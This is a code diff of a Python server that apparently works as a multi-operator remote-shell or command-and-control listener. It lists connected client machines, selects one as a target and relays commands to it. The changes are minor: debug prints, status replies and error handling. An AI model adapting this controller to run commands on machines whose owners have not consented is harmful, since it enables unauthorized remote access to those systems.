@@ -21,6 +21,8 @@ def send_data_target(ser):
             elif 'select' in cmd:
                 conn = get_target(cmd,ser)
                 if conn is not None:
+                    print("entered send target commands")
+
                     send_target_commands(conn,ser)
             elif 'exit' == cmd:
                 quit()
@@ -32,7 +34,7 @@ def send_data_target(ser):
     # Display all current active connections with client
 
     def list_connections(ser):
-        results = ''
+        results = ' '
 
         for i, conn in enumerate(normal_clients.all_connections):
             try:
@@ -44,8 +46,8 @@ def send_data_target(ser):
                 continue
 
             
-            results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
-        print(results)
+            results = str(i) + "   " + str(normal_clients.all_address[i][0]) + "   " + str(normal_clients.all_address[i][1]) + "\n"
+        #print(results)
         sudo_user.sender(ser, results)
         
 
@@ -56,6 +58,7 @@ def send_data_target(ser):
             target = cmd.replace('select ', '')  # target = id
             target = int(target)
             conn = normal_clients.all_connections[target]
+            sudo_user.sender(ser,"Selected")
             #print("You are now connected to :" + str(normal_clients.all_address[target][0]))
             #print(str(all_address[target][0]) + ">", end="")
             return conn
@@ -113,10 +116,12 @@ def send_data_target(ser):
                     
                     
             except Exception as msg:
-                print("Error sending commands",msg)
+                print("E: Error sending commands",msg)
                 break
-    start_turtle(ser)
-
+    try:
+        start_turtle(ser)
+    except Exception as msg:
+        print("E: Error", msg)
 
 accept_cl = threading.Thread(target=normal_clients.accepting_connections)
 sudo_use = threading.Thread(target=sudo_user.accepting_connections)
@@ -132,9 +137,12 @@ print("D: Started thread to accept clients")
 finished_conn = []
 print("D: Starting thread to create threads for sudo controllers")
 while True:
-    for i in sudo_user.all_connections:
-        if not i in finished_conn:
-            finished_conn.append(i)
-            data_s = threading.Thread(target=send_data_target,args=(i,))
-            data_s.daemon = True
-            data_s.start()
+    try:
+        for i in sudo_user.all_connections:
+            if not i in finished_conn:
+                finished_conn.append(i)
+                data_s = threading.Thread(target=send_data_target,args=(i,))
+                data_s.daemon = True
+                data_s.start()
+    except Exception as msg: 
+        print(f"E: {msg}")
